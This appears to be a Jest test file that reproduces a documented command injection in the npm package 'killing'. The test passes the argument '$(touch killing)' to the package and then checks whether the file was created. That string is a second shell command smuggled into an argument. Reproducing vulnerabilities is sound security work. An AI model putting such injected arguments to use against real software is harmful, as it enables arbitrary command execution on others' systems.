//problem is the program dosent end


//https://snyk.io/vuln/SNYK-JS-KILLING-1078532
test("Command Injection in killing", () => 
{
    const killing = require('killing');
	const fs = require('fs')
	const path = './killing'
	const sleep = require('sleep');
  
    killing('$(touch killing)');
	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});
// fs.accessSync('success', fs.constants.F_OK);